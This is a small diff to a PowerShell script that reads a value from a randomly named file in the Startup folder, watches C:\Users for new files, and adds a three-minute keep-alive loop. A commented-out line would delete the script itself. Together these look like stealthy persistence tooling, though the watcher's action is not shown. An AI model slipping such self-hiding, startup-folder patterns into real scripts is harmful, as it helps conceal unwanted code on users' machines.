@@ -1,4 +1,5 @@
 $global:user = (Get-Content "C:/Users/$env:userName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/etgtYmwQUO.txt").Trim()
+[bool] $global:undone = $true
 
 $watcher = New-Object System.IO.FileSystemWatcher
 $watcher.Path = "C:\Users"
@@ -13,5 +14,10 @@ $action = { $path = $Event.SourceEventArgs.FullPath
 }
 
 Register-ObjectEvent $watcher "Created" -Action $action
+
+while($undone) {
+  Start-Sleep -Seconds 180
+  $undone = $false
+}
 
 #Remove-Item $PSCommandPath -Force
